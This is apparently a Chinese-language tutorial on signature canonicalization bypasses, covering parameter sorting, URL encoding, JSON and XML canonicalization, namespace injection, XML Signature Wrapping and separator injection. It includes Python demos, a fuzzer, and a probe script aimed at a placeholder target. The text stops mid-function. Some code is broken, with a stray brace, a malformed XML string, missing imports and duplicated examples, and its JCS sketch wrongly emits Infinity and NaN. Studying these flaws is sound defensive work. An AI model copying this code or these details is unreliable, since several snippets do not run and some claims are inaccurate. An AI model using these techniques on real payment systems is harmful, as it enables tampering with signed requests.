# Canonicalization Attacks — 签名规范化绕过

> 规范化 (Canonicalization) 是签名系统的"盲点放大器"。签名方和验签方对同一数据的不同解析，直接导致同一个逻辑 payload 产生不同的签名值。攻击者不需要破解密钥，只需要**找到两边对数据理解不一致的地方**。

```
          sign(s)                     verify(s')
             │                            │
   data ──▶ canonical ──▶ hash ──▶ sign   │
             │                            │
   data ──▶ canonical' ──▶ hash ──▶ sign'  ──▶ MISMATCH!
             │
        攻击入口: 只要 canonical ≠ canonical'
```

## 1. 参数排序攻击

### 1.1 排序不一致是最大的坑

后端语言之间、甚至同一语言的不同版本，`ksort()` / `sorted()` / `Object.keys()` 的行为都可能不同。

```
签名方 (PHP):  ksort($params) → "a=1&b=2&c=3" → sign(hmac)
验签方 (Python): sorted(params.items()) → "a=1&b=2&c=3" → verify(hmac)
攻击:          params = {"b": "2", "a": "1", "c": "3"}
              PHP ksort → a, b, c ✓ (签名正确)
              Python sorted → a, b, c ✓ (验签正确)
              → 正常

但如果:
签名方 (PHP):  ksort($params) = "a=1&b=2&c=3"
验签方 (Go):   json.Marshal(params) = {"b":"2","c":"3","a":"1"}
              → 两边 canonical 不同 → 永远不会验签成功
              → 但攻击者可以利用这个差异做什么? 
              
              Answer: 找"一边排序一边不排序"的漏洞
```

核心场景：

| 场景 | 签名方 | 验签方 | 利用 |
|---|---|---|---|
| 验签方不排序 | sort → `a=1&b=2` | `b=2&a=1` (as-is) | 重排参数导致签名不同 → 直接拒绝? 但也许有遗漏 |
| 验签方排序 | `b=2&a=1` (as-is) | sort → `a=1&b=2` | 逻辑没问题，除非 sign 本身也在排序范围内 |
| 签名包含 sign 参数本身 | sort所有 | sort所有 | sign 字段参与排序 → 鸡生蛋问题 |

### 1.2 实战场景: sign 参与排序

有些低劣实现把 sign 也放进去排序然后签名，但此时 sign 值未知。但这种"先有鸡还是先有蛋"的问题有一个经典绕过：

**如果签名时 sign 作为空字符串参与拼接，但验签时 sign 带值参与拼接：**

```python
# sign_in_sort.py — sign 参数参与排序时的绕过
import hmac, hashlib, urllib.parse

def build_signed_request(params: dict, secret: str, include_sign_in_sort: bool):
    """模拟签名方: 排序参数并拼接"""
    # 有些实现先加 sign="" 再排序
    if include_sign_in_sort:
        sorted_params = dict(sorted(params.items()))
    else:
        sorted_params = dict(sorted({k: v for k, v in params.items() if k != "sign"}.items()))
    
    # 拼接
    pairs = [f"{k}={v}" for k, v in sorted_params.items()]
    query = "&".join(pairs)
    sig = hmac.new(secret.encode(), query.encode(), hashlib.sha256).hexdigest()
    return query, sig

# 场景: 签名时 sign 字段是空, 排序后拼接, 验签时 sign 有值
params = {"amount": "100", "order_id": "ORD001", "user": "admin"}
secret = "test_secret"

# 签名方: 包含 sign 字段 (值为空)
params_with_sign = {**params, "sign": ""}
query, sig = build_signed_request(params_with_sign, secret, include_sign_in_sort=True)
print(f"签名方拼接: {query}")
print(f"签名: {sig}")

# 验签方: sign 有值, 但它也参与排序
params_verify = {**params, "sign": sig}
query_v, _ = build_signed_request(params_verify, secret, include_sign_in_sort=True)
print(f"验签方拼接: {query_v}")

# 结果: 两个签名不同! 但因为 sign 不可能预先知道, 这实际上是个 BUG
```

可能的绕过：

```python
# 绕过思路1: 如果 sign 在验签时排在最后且被截断
# sign = "abc..." 但拼接时可能 params["sign"] 太长被截断

# 绕过思路2: 如果 sign 字段在验签时排在 key 后面
# sorted({"amount": "100", "sign": "xxx"})
# → amount=100&sign=xxx
# 而签名时 sign 是空 → amount=100&sign=
# 两者不同 → 永远验不过 → 但如果有某种方式注入 &sign=xxx 呢?

# 绕过思路3: 如果参数名包含分隔符号
# key = "sign\n" vs "sign" 排序不同
```

### 1.3 PHP ksort vs JS Object.keys vs Python sorted

```python
# sort_discrepancies.py — 跨语言排序差异
import json

# PHP ksort: 默认 SORT_REGULAR, 字符串按字典序, 数字 key 按数字序
# $params = ["b" => "2", "a" => "1", "2" => "x", "1" => "y"];
# ksort($params);
# → ["1" => "y", "2" => "x", "a" => "1", "b" => "2"]
# PHP 把数字字符串 key 转成 int 再排序!

# JS Object.keys():
# Object.keys({b: "2", a: "1", "2": "x", "1": "y"})
# → ["1", "2", "a", "b"]  # 数字 key 先, 按升序; 字符串按插入顺序

# Python sorted():
# sorted({"b": "2", "a": "1", "2": "x", "1": "y"}.items())
# → [("1", "y"), ("2", "x"), ("a", "1"), ("b", "2")]

def php_ksort_like(params: dict):
    """模拟 PHP ksort 行为 (数字 key 优先)"""
    int_keys = {}
    str_keys = {}
    for k, v in params.items():
        try:
            int_key = int(k)
            if str(int_key) == k:
                int_keys[int_key] = v
                continue
        except (ValueError, TypeError):
            pass
        str_keys[k] = v
    result = {}
    for k in sorted(int_keys):
        result[str(k)] = int_keys[k]
    for k in sorted(str_keys):
        result[k] = str_keys[k]
    return result

def js_object_keys_order(params: dict):
    """模拟 JS Object.keys 排序 (数字 key 升序优先, 字符串按插入顺序)"""
    int_keys = {}
    str_keys = {}
    for k, v in params.items():
        try:
            int_key = int(k)
            if str(int_key) == k:
                int_keys[int_key] = v
                continue
        except (ValueError, TypeError):
            pass
        str_keys[k] = v
    result = {}
    for k in sorted(int_keys):
        result[str(k)] = int_keys[k]
    for k in str_keys:
        result[k] = str_keys[k]
    return result

# 测试: 混合数字和字符串 key
test_params = {
    "b": "2",
    "a": "1",
    "100": "z",
    "2": "x",
    "1": "y",
    "c": "3",
}

print("原始顺序:", list(test_params.keys()))
print("PHP ksort:  ", list(php_ksort_like(test_params).keys()))
print("JS Obj.keys:", list(js_object_keys_order(test_params).keys()))
print("Python sort:", [k for k, v in sorted(test_params.items())])

# 关键结论: 如果签名系统在 PHP (ksort) 和 Go/Java (自然顺序) 之间校验
# 混合数字签名 key 时会产生不可调和的差异
```

### 1.4 跨语言排序 fuzzer

```python
# sort_fuzzer.py — 跨语言排序差异 Fuzzer
import random, string, json

def gen_param_names(count: int = 10):
    """生成混合类型的参数名"""
    names = set()
    while len(names) < count:
        choice = random.randint(0, 3)
        if choice == 0:
            names.add(str(random.randint(0, 999)))  # 纯数字
        elif choice == 1:
            names.add("".join(random.choices(string.ascii_lowercase, k=random.randint(1, 5))))
        elif choice == 2:
            names.add(str(random.randint(0, 999)) + random.choice(string.ascii_lowercase))
        else:
            names.add(random.choice(string.ascii_lowercase) + str(random.randint(0, 999)))
    return list(names)

sorters = {
    "python_sorted": lambda d: [k for k, _ in sorted(d.items())],
    "php_ksort": lambda d: list(php_ksort_like(d).keys()),
    "js_keys": lambda d: list(js_object_keys_order(d).keys()),
    "sorted_keys": lambda d: sorted(d.keys()),
}

# 跑 100 轮
for round_num in range(100):
    names = gen_param_names(8)
    params = {n: str(random.randint(1, 100)) for n in names}
    orders = {name: sorter(params) for name, sorter in sorters.items()}
    
    # 检查是否有任何两两不同
    ref = list(orders.keys())[0]
    ref_order = orders[ref]
    mismatches = []
    for name, order in orders.items():
        if order != ref_order:
            mismatches.append((name, order))
    
    if mismatches:
        print(f"\n=== Round {round_num}: MISMATCH {ref}={ref_order} ===")
        for name, order in mismatches:
            print(f"  {name}: {order}")
        with open("sort_mismatches.json", "a") as f:
            f.write(json.dumps({"params": params, "orders": orders}) + "\n")
```

## 2. URL 编码差异

### 2.1 space = %20 or + ?

这是签名规范化的经典陷阱。

```
application/x-www-form-urlencoded:  space = +
RFC 3986 (URI):                      space = %20

签名方用 + 编码空格, 验签方用 %20 解码 → 签名不匹配!
```

```python
# url_encoding_attacks.py — URL 编码差异利用
import hashlib, hmac, urllib.parse

def url_normalization_battle():
    """演示 URL 编码差异导致的签名绕过"""
    secret = "pwn"
    params = {"name": "hello world", "role": "user"}
    
    # 签名方: 用 + 编码空格 (PHP http_build_query 默认行为)
    signer_query = "name=hello+world&role=user"
    signer_sig = hmac.new(secret.encode(), signer_query.encode(), hashlib.sha256).hexdigest()
    print(f"签名方 query:  {signer_query}")
    print(f"签名方签名:    {signer_sig}")
    
    # 验签方: 用 %20 编码空格 (Python urllib.parse.urlencode 默认)
    verifier_query = "name=hello%20world&role=user"
    verifier_sig = hmac.new(secret.encode(), verifier_query.encode(), hashlib.sha256).hexdigest()
    print(f"验签方 query:  {verifier_query}")
    print(f"验签方签名:    {verifier_sig}")
    print(f"签名匹配: {signer_sig == verifier_sig}")
    
    # 攻击者可以利用: 如果 payload 包含空格, 两边编码不同
    # → 把 name=admin 改成 name=admin (空格前后差异)
    
    # 更进一步: 有些系统对一部分参数用 +, 一部分用 %20
    # 或者只在特定位置做 urlencode → 可以"逃逸"参数
```

### 2.2 双重重编码 (Double Encoding)

```
原始:         a=1&b=2
签名(已编码): a=1%26b%3D2   # 把整个 query string 当成一个值再编码
验签:         urldecode("a=1%26b%3D2") → "a=1&b=2"
             → 和直接拼接 "a=1&b=2" 不同!
```

利用方式:

```
如果签名是:
    sign = MD5(urlencode("status=paid&amount=" + amount))

用户提交 amount=100&status=paid:
    urlencode("status=paid&amount=100&status=paid")
    = "status%3Dpaid%26amount%3D100%26status%3Dpaid"
    
但后端验签时可能 decode 一次:
    urldecode("status%3Dpaid%26amount%3D100%26status%3Dpaid")
    = "status=paid&amount=100&status=paid"
    → 两个 status=paid! 有些后端取第一个，有些取最后一个
```

```python
def double_encode_exploit():
    """双重重编码绕过示例"""
    
    # 假设签名逻辑:
    # raw = "amount=" + amount + "&status=paid"
    # encoded = urlencode(raw)   ← 对整个 raw string 做 urlencode
    # sign = MD5(encoded)
    
    import urllib.parse
    
    def naive_sign(amount: str, secret: str):
        raw = f"amount={amount}&status=paid"
        # 注意: 这里对整个值字符串做 encode, 相当于把 & = 也转义了
        encoded = urllib.parse.quote(raw, safe="")
        sig = hashlib.md5((encoded + secret).encode()).hexdigest()
        return encoded, sig
    
    def verify_safe(encoded: str, sig: str, secret: str):
        """正确验签: 先 decode 再拆参数"""
        decoded = urllib.parse.unquote(encoded)
        # 提取 amount
        params = dict(p.split("=", 1) for p in decoded.split("&"))
        expected_encoded, expected_sig = naive_sign(params.get("amount", ""), secret)
        return sig == expected_sig
    
    def verify_unsafe(encoded: str, sig: str, secret: str):
        """错误验签: 直接用 encoded 拼参数 (没 decode)"""
        # 直接当 query string 解析, 会自动 urldecode 一次
        params = dict(urllib.parse.parse_qsl(encoded))
        expected_encoded, expected_sig = naive_sign(params.get("amount", ""), secret)
        return sig == expected_sig
    
    secret = "double_whammy"
    
    # 正常情况
    enc, sig = naive_sign("100", secret)
    print(f"正常 encoded: {enc}")
    print(f"    safe verify: {verify_safe(enc, sig, secret)}")
    print(f"    unsafe verify: {verify_unsafe(enc, sig, secret)}")
    
    # 注入 -> 如果验签 unsafe, 可以注入额外参数
    # 但我们注入的参数经过 urlencode 后变成 %26, 不会被直接当成 &
    inject_enc, inject_sig = naive_sign("100%26status=cancelled", secret)
    print(f"\n注入后 encoded: {inject_enc}")
    
    # unsafe verify: parse_qsl("amount=100%26status%3Dcancelled&status=paid")
    # → {"amount": "100&status=cancelled", "status": "paid"}
    # → 如果取最后一个 status, 还是 paid, 但如果取第一个...
    params_unsafe = dict(urllib.parse.parse_qsl(inject_enc))
    print(f"    unsafe params: {params_unsafe}")
```

### 2.3 选择性编码

有些系统只对 value 编码，不对 key 编码。但有些系统全部编码。

```python
def selective_encoding_exploit():
    """
    如果签名时: key=urldecode(key), value=urlencode(value)
    但验签时:   key=key, value=value (假设传输时已编码)
    """
    
    # 被编码的 key 可能包含 & 号, 导致参数拆分
    # key = "a%26b", value = "c"
    # 签名方: key_clean = urldecode("a%26b") = "a&b"
    #         拼接: "a&b=c" → 被解析为两个参数!
    # 验签方: 直接拿到 "a%26b=c" → 一个参数
    
    # 反过来:
    # key = "a", value = "b%26c"
    # 签名方: value_clean = urldecode("b%26c") = "b&c"
    #         拼接: "a=b&c" → 被解析为 a=b 和 c=(空)
    
    import urllib.parse
    
    # 这个假设签名先 decode 再签名:
    raw_params = {"a%26b": "c", "d": "e"}
    
    # 签名方处理:
    cleaned = {}
    for k, v in raw_params.items():
        clean_k = urllib.parse.unquote(k)  # a&b
        clean_v = urllib.parse.unquote(v)  # c
        cleaned[clean_k] = clean_v
    
    # 拼接: "a&b=c&d=e" → 3 个参数!
    query = "&".join(f"{k}={v}" for k, v in cleaned.items())
    print(f"签名方拼接(已decode): {query}")  # a&b=c&d=e → 这是 3 个参数!
    parsed = dict(p.split("=", 1) for p in query.split("&"))
    print(f"解析结果: {parsed}")  # {"a": "", "b": "c", "d": "e"}
```

### 2.4 Unicode 在 URL 参数中

```python
# unicode_url.py
def unicode_in_url_params():
    """
    不同语言的 URL 编码对 Unicode 的处理
    
    Python: urllib.parse.quote("中文") → "%E4%B8%AD%E6%96%87"
    PHP:    urlencode("中文")          → "%E4%B8%AD%E6%96%87" (UTF-8)
    JS:     encodeURIComponent("中文") → "%E4%B8%AD%E6%96%87"
    
    但如果后端不是 UTF-8:
    PHP:    urlencode(mb_convert_encoding("中文", "GBK"))
            → "%D6%D0%CE%C4"  ← 完全不同!
    
    签名方用 GBK, 验签方用 UTF-8 → 两个不同的 sign!
    """
    
    # 如果攻击者可以控制字符编码方式:
    # 同一个字符 "中" 在 UTF-8 是 3 字节, GBK 是 2 字节
    # 如果系统用 raw bytes 签名: 两个完全不同
    
    utf8_bytes = "中".encode("utf-8")  # b'\xe4\xb8\xad'
    gbk_bytes = "中".encode("gbk")     # b'\xd6\xd0'
    print(f"UTF-8: {utf8_bytes.hex()}  GBK: {gbk_bytes.hex()}")
    
    # 如果签名 = MD5(value_bytes + key)
    # 那同一个"中"字产生完全不同的两个签名
    utf8_sig = hashlib.md5(utf8_bytes + b"secret").hexdigest()
    gbk_sig = hashlib.md5(gbk_bytes + b"secret").hexdigest()
    print(f"UTF-8 sign: {utf8_sig}")
    print(f"GBK sign:   {gbk_sig}")
    print(f"Match: {utf8_sig == gbk_sig}")
```

### 2.5 URL 编码探测矩阵

```python
# url_encode_probe.py — 探测系统如何处理 URL 编码
import requests, json

BASE = "https://target"

URL_ENCODE_PROBES = [
    # 空格编码
    {"space_plus": "hello+world"},
    {"space_pct20": "hello%20world"},
    {"space_raw": "hello world"},
    
    # 双编
    {"double_encode": "hello%2520world"},  # %25 = %
    {"triple_encode": "hello%252520world"},
    
    # 符号
    {"ampersand": "a&b"},
    {"equals": "a=b"},
    {"percent": "100%"},
    {"percent25": "100%25"},
    
    # Unicode
    {"chinese_utf8": "中文"},
    {"fullwidth": "１００"},  # full-width digits
    {"emoji": "🔥"},
    
    # Edge cases
    {"null_byte": "hello\x00world"},
    {"newline": "hello\nworld"},
    {"carriage_return": "hello\rworld"},
    {"tab": "hello\tworld"},
    
    # 不编码的特殊字符
    {"tilde": "~"},  # RFC 3986 unreserved
    {"dash": "-"},
    {"dot": "."},
    {"underscore": "_"},
]

def probe_url_encoding(endpoint: str, param_name: str = "data"):
    """发送不同 URL 编码的 payload, 看后端如何解析"""
    for probe in URL_ENCODE_PROBES:
        label = list(probe.keys())[0]
        value = list(probe.values())[0]
        
        # 作为 URL query param 发送
        encoded_value = urllib.parse.quote(value, safe="")
        url = f"{endpoint}?{param_name}={encoded_value}"
        r = requests.get(url, timeout=10)
        
        # 也作为 form data 发送
        r2 = requests.post(endpoint, data={param_name: value}, timeout=10)
        
        print(f"{label:20s} | GET:{r.status_code} POST:{r2.status_code} | "
              f"resp:{r.text[:60]}")
```

## 3. JSON 规范化

### 3.1 Key 排序

JSON 对象的 key 顺序在标准中不保证，但几乎所有实现都保留插入顺序。然而不同语言仍可能有差异。

```python
# json_canonical.py — JSON 规范化攻击大全
import json, hashlib, hmac

def json_key_order_exploit():
    """
    签名方: json.dumps(obj, sort_keys=True)  # {"a":1,"b":2}
    验签方: json.dumps(obj)                   # {"b":2,"a":1}
    → 签名不匹配, 基本功能就坏了
    
    但更微妙的: 验签方用某语言的 JSON 库, 数字 key 行为不同
    """
    
    # Python json.dumps: 数字 key 变成字符串
    # {"1": "a", "2": "b"} → '{"1": "a", "2": "b"}'
    
    # PHP json_encode: 数字 key 保持数字 (如果连续)
    # ["a", "b"] 而不是 {"1":"a","2":"b"}
    
    # Go json.Marshal: 数字 key 自动变字符串
    # 但 map[int]string 需要特殊处理
    
    payload = {1: "a", 2: "b"}
    
    # Python 序列化
    py_json = json.dumps(payload)
    print(f"Python: {py_json}")
    
    # PHP json_encode (模拟)
    # 连续数字索引 → 会变成数组
    php_json = json.dumps([payload[1], payload[2]]) if len(payload) > 0 else "{}"
    print(f"PHP (数组): {php_json}")
    
    # 但 PHP 不连续数字:
    payload_sparse = {1: "a", 3: "b"}
    # PHP: {"1":"a","3":"b"}   (对象)
    # Python: {"1": "a", "3": "b"}
    
    py_sparse = json.dumps(payload_sparse)
    print(f"Python sparse: {py_sparse}")
    # PHP sparse (模拟): {"1": "a", "3": "b"} 相同
    
    print("结论: 数字 key 在连续时会变成数组, 破坏签名")
```

### 3.2 空白字符

```python
def whitespace_exploit():
    """JSON 空白字符差异"""
    
    obj = {"a": 1, "b": 2}
    
    # 不同空白形式
    forms = [
        json.dumps(obj, separators=(",", ":")),         # 无空格
        json.dumps(obj),                                 # 标准空格
        json.dumps(obj, indent=2),                       # 缩进
        json.dumps(obj, separators=(",\n", ": ")),       # 自定义
    ]
    
    for f in forms:
        sig = hashlib.sha256(f.encode()).hexdigest()[:16]
        print(f"JSON: {repr(f):40s}  sign: {sig}")
    
    # 如果签名方用 indent=0, 验签方用 indent=2
    # 两个 JSON 逻辑相同, 签名不同 → 攻击者可以利用
    
    # 具体绕过: 如果验签方先 parse 再 re-stringify:
    # 传 {"a":1,"b":2}  但是用 tabs 而不是空格
    # 验签方: JSON.parse → {"a":1,"b":2} → JSON.stringify → {"a":1,"b":2}
    # 如果签名方也是 stringify → 一致
    
    # 但如果验签方直接拿 raw body:
    # 传 {"a":1,"b":2} (tabs)
    # 验签方: raw body + re-sign ≠ 原始 sign
    # → 除非攻击者能控制 raw body 让两边一致
```

### 3.3 数字表示

```python
def number_form_exploit():
    """同一数值的不同 JSON 表示"""
    
    obj_value = 100
    
    number_forms = [
        '100',          # 整数
        '100.0',        # 带小数
        '1e2',          # 科学记数法
        '1.0e2',        # 带小数科学记数法
        '0.1e3',        # 另一种
        '100.00',       # 多余尾数
        '+100',         # 正号 (某些解析器接受)
        ' 100',         # 前导空格
        '100 ',         # 尾部空格
    ]
    
    print("JSON 数值表示差异:")
    for f in number_forms:
        # Python json.loads 接受其中几种
        try:
            parsed = json.loads(f)
            sig = hashlib.sha256(f.encode()).hexdigest()[:16]
            print(f"  input={repr(f):16s} parsed={parsed} sign={sig}")
        except json.JSONDecodeError:
            print(f"  input={repr(f):16s} INVALID JSON")
    
    print("\n关键: 不同 JSON 库对数字的解析不同")
    print("- Python: 1e2 → 100.0, json.dumps → 100.0  (不是 100)")
    print("- PHP:    json_encode(100) → 100")
    print("- JS:     JSON.stringify(100) → 100")
    print("- Go:     json.Marshal(100) → 100")
    
    # 如果签名方: json.dumps({"amount": 1e2}) → '{"amount": 100.0}'
    # 验签方:    json.dumps({"amount": 100})  → '{"amount": 100}'
    # → 签名不同!
```

### 3.4 字符串转义

```python
def string_escape_exploit():
    """JSON 字符串的不同转义方式"""
    
    obj = {"msg": "hello\nworld"}
    
    escape_forms = [
        '{"msg":"hello\\nworld"}',           # literal newline escape
        '{"msg":"hello\\u000aworld"}',        # unicode escape for newline
        '{"msg":"hello\\u000Aworld"}',        # uppercase unicode
        '{"msg":"hello\\u000aworld"}',        # lowercase unicode
        '{"msg":"hello\\u000aworld"}',        # 4-digit hex
        '{"msg":"hello\\u000aworld"}',        # same
        '{"msg":"hello\\u000Aworld"}',        # uppercase hex
        '{"msg":"hello\\u000aworld"}',        # zero padding variant
    ]
    
    print("JSON 字符串转义差异:")
    for f in set(escape_forms):
        parsed = json.loads(f)
        sig = hashlib.sha256(f.encode()).hexdigest()[:16]
        print(f"  raw={repr(f):40s} parsed={repr(parsed)} sign={sig}")
    
    # 更多转义变体:
    more_escapes = [
        '{"msg":"hello\\u0061world"}',         # \\u0061 = 'a'
        '{"msg":"hello\\u0041world"}',         # \\u0041 = 'A'
        '{"msg":"hello\\u0041world"}',          # 大写 unicode
        '{"msg":"hello\\u0041world"}',           # 不转义也没问题
    ]
    
    # 实际攻击:
    # 如果签名用 raw JSON body, 验签也 raw body
    # 但 HTML 表单里的数据可能被浏览器/框架反转义后再签名
    
    # 一个像素攻击:
    # 签名: '{"msg":"hello\\u0061world"}'  (转义 'a')
    # 传输: '{"msg":"helloworld"}'          (??? 如果 a 被吞了)
```

### 3.5 重复 Key

```python
def duplicate_key_exploit():
    """JSON 重复 key 的不同处理"""
    
    dup_payloads = [
        # 两个相同 key, 值不同
        '{"amount":100,"amount":0.01}',              # 重复 key
        '{"amount":100,"amount":0.01,"amount":0}'},  # 三重 key
        '{"amount":100,"AMOUNT":0.01}',              # 大小写不同
        '{"amount":100,"amount ":0.01}',             # 尾部空格
        '{"amount":100," amount":0.01}',             # 前导空格
        '{"amount":100,"amount":null}',               # 覆盖为 null
    ]
    
    print("重复 Key 处理差异:")
    print()
    
    # Python: 最后一个 wins
    for p in dup_payloads:
        try:
            parsed = json.loads(p)
            print(f"  Python: {p}")
            print(f"    → amount = {parsed.get('amount')}")
        except json.JSONDecodeError:
            print(f"  Python: {p} → INVALID")
    
    print()
    print("语言差异:")
    print("- Python/Ruby:   最后一个 value wins")
    print("- Go:            最后一个 wins")
    print("- PHP:           最后一个 wins (json_decode)")
    print("- Java/Jackson:  默认抛异常, 可配置为第一个 wins")
    print("- JS:            最后一个 wins (ES 规范)")
    print("- C# (Newtonsoft): 默认最后一个 wins, 可配置")
    
    print()
    print("攻击场景:")
    print("1. 签名方 (Python): last wins → amount=0.01")
    print("   验签方 (Java with FAIL_ON_DUPLICATE): 抛异常")
    print("   → 降级到默认值, 可能为 0 或 null")
    print("2. 签名方 (JS): last wins → amount=0.01")
    print("   验签方 (PHP with loose mode): last wins → amount=0.01")
    print("   但签名时取了第一个 amount=100 → SIGN MISMATCH!") 
    print("   → 但如果攻击者可以让数组行为不同...")
```

### 3.6 JCS (JSON Canonicalization Scheme) vs raw JSON.stringify

```python
# jcs_demo.py
import json, hashlib

def jcs_canonicalize(obj):
    """简易 JCS 实现 (RFC 8785)"""
    if isinstance(obj, dict):
        # JCS: key 必须按字典序排序
        items = sorted(
            (str(k), jcs_canonicalize(v)) for k, v in obj.items()
        )
        return "{" + ",".join(f'{json.dumps(k)}:{v}' for k, v in items) + "}"
    elif isinstance(obj, list):
        return "[" + ",".join(jcs_canonicalize(v) for v in obj) + "]"
    elif isinstance(obj, bool):
        return "true" if obj else "false"
    elif isinstance(obj, int) and not isinstance(obj, bool):
        return str(obj)
    elif isinstance(obj, float):
        # JCS 对 float 有特殊处理
        if obj == float("inf"):
            return "Infinity"
        elif obj == float("-inf"):
            return "-Infinity"
        elif obj != obj:  # NaN
            return "NaN"
        return str(obj)
    elif obj is None:
        return "null"
    elif isinstance(obj, str):
        return json.dumps(obj, ensure_ascii=True)
    return json.dumps(obj)

# 对比 raw JSON.stringify vs JCS
payload = {
    "b": 2,
    "a": 1,
    "c": {"z": 26, "y": 25}
}

raw_json = json.dumps(payload)  # Python 默认保留插入顺序
jcs_json = jcs_canonicalize(payload)

print(f"Raw JSON:          {raw_json}")
print(f"JCS:               {jcs_json}")

# 不同语言/库的 raw JSON 输出:
# Python: 保留插入顺序 → '{"b": 2, "a": 1, "c": {"z": 26, "y": 25}}'
# PHP:    json_encode   → 保留插入顺序 (PHP 7+)
# JS:     JSON.stringify → 保留插入顺序 (ES2015+)
# JCS:    排序 →         '{"a":1,"b":2,"c":{"y":25,"z":26}}'

# 如果系统用 JCS 签名但用 raw JSON 验签 (或反过来):
raw_sig = hashlib.sha256(raw_json.encode()).hexdigest()[:16]
jcs_sig = hashlib.sha256(jcs_json.encode()).hexdigest()[:16]
print(f"Raw sig: {raw_sig}")
print(f"JCS sig: {jcs_sig}")
print(f"Match: {raw_sig == jcs_sig}")
```

## 4. XML 规范化

### 4.1 XML Canonicalization (C14N) vs raw XML

XML 签名 (XML DSig) 强制要求 canonicalization，但实际实现中经常出问题。

```python
# xml_canonicalization.py — XML 规范化攻击
import hashlib

def xml_c14n_variants():
    """XML 规范化差异演示 (纯文本演示)"""
    
    # 逻辑相同的 XML, 不同序列化
    xml_forms = [
        # 标准形式
        '<root><amount>100</amount><status>paid</status></root>',
        
        # 自闭合标签
        '<root><amount>100</amount><status>paid'/></root>',  # 不是同语义
        
        # 属性顺序
        '<root a="1" b="2"><amount>100</amount></root>',
        '<root b="2" a="1"><amount>100</amount></root>',
        
        # 空白差异
        '<root>\n  <amount>100</amount>\n</root>',
        '<root>  <amount>100</amount>  </root>',
        
        # 命名空间
        '<root xmlns:ns="http://example.com"><ns:amount>100</ns:amount></root>',
        '<root xmlns:ns="http://example.com"><amount xmlns="">100</amount></root>',
        
        # CDATA vs text
        '<root><amount>100</amount></root>',
        '<root><amount><![CDATA[100]]></amount></root>',
        
        # 注释 (是否要排除?)
        '<!-- comment --><root><amount>100</amount></root>',
        '<root><!-- comment --><amount>100</amount></root>',
    ]
    
    print("XML 规范化差异:")
    for x in xml_forms:
        sig = hashlib.sha256(x.encode()).hexdigest()[:16]
        print(f"  {x[:60]:60s} sign={sig}")
    
    # Inclusive C14N: 包含所有命名空间声明, 子元素继承父元素的命名空间
    # Exclusive C14N: 只包含子元素实际使用的命名空间, 简化签名
    #
    # Inclusive vs Exclusive 的坑:
    # 签名方 Inclusive C14N → 包含了 xmlns:foo="..."
    # 验签方 Exclusive C14N → 没有 xmlns:foo
    # → 签名不匹配!
```

### 4.2 命名空间注入

```python
def namespace_injection():
    """利用命名空间差异绕过 XML 签名"""
    
    # 场景: XML 签名验证时, 签名方和验签方对默认命名空间的理解不同
    
    # 合法 XML (被签名)
    legitimate = '''<root xmlns="http://example.com/payment">
    <amount>100</amount>
    <status>paid</status>
</root>'''
    
    # 注入命名空间后的版本 (签名不变, 但解析不同)
    injected = '''<root xmlns="http://example.com/payment"
          xmlns:evil="http://evil.com">
    <amount>100</amount>
    <status>paid</status>
    <evil:override>true</evil:override>
</root>'''
    
    # Inclusive C14N:
    # 签名时: <root xmlns="http://example.com/payment">  → 签名包含此命名空间
    # 验证时: <root xmlns="http://example.com/payment" xmlns:evil="http://evil.com">
    #         → C14N 包含了两个命名空间
    #         → 签名不同!
    
    # Exclusive C14N:
    # 签名时: <root xmlns="http://example.com/payment">  → 签名包含
    # 验证时: <root xmlns="http://example.com/payment" xmlns:evil="http://evil.com">
    #         → Exclusive 只包含实际使用的命名空间
    #         → "evil" 没有被 amount/status 使用 → 不包含
    #         → 签名相同! → 注入成功
    
    print("命名空间注入:")
    print(f"合法: {legitimate[:80]}...")
    print(f"注入: {injected[:80]}...")
    print()
    print("如果使用 Exclusive C14N, 注入的 xmlns:evil 不影响签名")
    print("但 XML 解析器可能读取 <evil:override> 来改变行为")
```

### 4.3 XML Signature Wrapping (XSW)

**详见** [02-auth/saml-attacks.md](../02-auth/saml-attacks.md) 的详细 SAML 攻击。

```python
# xml_signature_wrapping.py — XSW 核心概念
def xsw_concept():
    """XML Signature Wrapping — 保持签名有效但改变逻辑"""
    
    # 原始被签名的 XML:
    signed = '''<Payment>
    <Amount>100</Amount>
    <Signature>...</Signature>
</Payment>'''
    
    # 包装后的 XML (签名验证通过, 但业务逻辑读到攻击者的值):
    wrapped = '''<Payment>
    <Amount>0.01</Amount>          <!-- 这是攻击者插入的 -->
    <Payment>                       <!-- 包装 -->
        <Amount>100</Amount>        <!-- 这是被签名的, 但被忽略 -->
        <Signature>...</Signature>
    </Payment>
</Payment>'''
    
    # 关键: 验证签名时找到的是内部 <Payment> 里面的内容
    # 但业务逻辑读到的是外部 <Payment> 的 <Amount>
    
    print("XSW 核心: 签名验证路径 ≠ 数据消费路径")
    print(f"  签名验证: Payment[1] → Amount=100 → ✓ 签名有效")
    print(f"  业务逻辑: //Amount[1] → 0.01 → 只付了 1 分钱")
```

## 5. 多部分消息签名

### 5.1 拼接顺序

```python
# multi_part_sign.py — 多部分拼接攻击
import hashlib, hmac

def concat_order_attack():
    """利用拼接顺序差异绕过签名"""
    
    # 场景: sign = hash(part1 + part2 + part3)
    
    # 正常:
    p1, p2, p3 = "user=admin", "role=user", "amount=100"
    
    # 如果攻击者可以控制 p2:
    # p2 = "role=admin&amount=0.01"
    # sign = hash("user=admin" + "role=admin&amount=0.01" + "amount=100")
    #      = hash("user=adminrole=admin&amount=0.01amount=100")
    #
    # 但系统实际解析时可能取第一个 amount=0.01!
    
    print("拼接注入:")
    p1 = "user=admin"
    p2 = "role=admin&amount=0.01"  # 攻击者注入的
    p3 = "amount=100"             # 服务器附加的
    
    raw = p1 + p2 + p3
    print(f"  签名拼接: {raw}")
    print(f"  解析参数:")
    params = dict(p.split("=", 1) for p in raw.split("&"))
    for k, v in params.items():
        print(f"    {k} = {v}")
    
    # 如果后端按 key 取, 有的取第一个, 有的取最后一个
    # amount 出现两次 → 可能存在差异
```

### 5.2 分隔符注入

```python
def separator_injection():
    """在参数值中注入分隔符"""
    
    # sign = hash(a + "|" + b + "|" + c)
    # 如果 b 的值包含 "|":
    # b = "evil|admin"
    # sign = hash(a + "|" + "evil|admin" + "|" + c)
    #      = hash(a + "|" + "evil" + "|" + "admin|" + c)
    # 解析时: [a, evil, admin, c] ← 4 个部分
    
    secret = "test"
    
    def sign(a, b, c):
        raw = f"{a}|{b}|{c}"
        sig = hmac.new(secret.encode(), raw.encode(), hashlib.sha256).hexdigest()
        return raw, sig
    
    def verify_and_parse(sig_input, raw, expected_a, expected_c):
        """验签并解析"""
        expected_raw, expected_sig = sign(expected_a, "?", expected_c)  # dummy
        parts = raw.split("|")
        return {
